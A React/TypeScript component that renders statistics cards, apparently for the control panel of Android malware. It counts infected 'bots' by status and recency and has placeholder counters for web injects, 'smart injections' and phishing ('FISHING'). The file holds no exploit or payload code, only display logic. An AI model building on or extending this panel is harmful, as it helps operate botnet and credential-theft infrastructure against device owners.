import React from "react";
import {Col, ColProps, Row} from "antd";
import {useTranslation} from "react-i18next";
import {AppState} from "../../../Store/RootReducer";
import {useAppSelector} from "../../../Hook/useAppSelector";

const CountersCards: React.FC = () => {
    const {t} = useTranslation();
    const statsReducer = useAppSelector((state: AppState) => state.stats);

    const colConfig: ColProps = {xxl: 8, xl: 8, md: 12, sm: 12, xs: 24};

    return (
        <Row gutter={15}>
            <Col {...colConfig}>
                <div className="stat-block">
                    <div className="stat-block-head">
                        <i className="fa-brands fa-android" />
                        <span>
                            {t("STATS_BOTS")}
                        </span>
                    </div>
                    <div className="stat-block-body">
                        <div className="stat-list">
                            <div className="stat-list-item">
                                <span>{t("STATS_ONLINE")}</span>
                                <span>{statsReducer.bots.counts.online}</span>
                            </div>
                            <div className="stat-list-item">
                                <span>{t("STATS_OFFLINE")}</span>
                                <span>{statsReducer.bots.counts.offline}</span>
                            </div>
                            <div className="stat-list-item">
                                <span>{t("STATS_NO_PERMISSIONS")}</span>
                                <span>{statsReducer.bots.counts.permissionless}</span>
                            </div>
                            <div className="stat-list-item">
                                <span>{t("STATS_DELETED_APP")}</span>
                                <span>{statsReducer.bots.counts.uninstalled}</span>
                            </div>
                        </div>
                    </div>
                </div>
            </Col>
            <Col {...colConfig}>
                <div className="stat-block">
                    <div className="stat-block-head">
                        <i className="fa-solid fa-square-arrow-up-right"/>
                        <span>
                            {t("STATS_NEW_BOTS")}
                        </span>
                    </div>
                    <div className="stat-block-body">
                        <div className="stat-list">
                            <div className="stat-list-item">
                                <span>{t("STATS_NEW_BOTS_PAST_HOUR")}</span>
                                <span>{`+${statsReducer.bots.counts.lastHour}`}</span>
                            </div>
                            <div className="stat-list-item">
                                <span>{t("STATS_NEW_BOTS_PAST_DAY")}</span>
                                <span>{`+${statsReducer.bots.counts.lastDay}`}</span>
                            </div>
                            <div className="stat-list-item">
                                <span>{t("STATS_NEW_BOTS_PAST_WEEK")}</span>
                                <span>{`+${statsReducer.bots.counts.lastWeek}`}</span>
                            </div>
                            <div className="stat-list-item">
                                <span>{t("STATS_NEW_BOTS_PAST_MONTH")}</span>
                                <span>{`+${statsReducer.bots.counts.lastMonth}`}</span>
                            </div>
                        </div>
                    </div>
                </div>
            </Col>
            <Col {...colConfig} md={24} sm={24}>
                <div className="stat-block">
                    <div className="stat-block-head">
                        <i className="fa-solid fa-square-poll-vertical" />
                        <span>
                            {t("STATS_ETC")}
                        </span>
                    </div>
                    <div className="stat-block-body">
                        <div className="stat-list">
                            <div className="stat-list-item">
                                <span>{t("INJECTS_LOGS")}</span>
                                <span>0</span>
                            </div>
                            <div className="stat-list-item">
                                <span>{t("SIDEBAR_NAV_SMART_INJECTIONS")}</span>
                                <span>0</span>
                            </div>
                            <div className="stat-list-item">
                                <span>{t("FISHING")}</span>
                                <span>0</span>
                            </div>
                            <div className="stat-list-item">
                                <span>{t("SIDEBAR_NAV_USERS")}</span>
                                <span>0</span>
                            </div>
                        </div>
                    </div>
                </div>
            </Col>
        </Row>
    );
};

export default CountersCards;
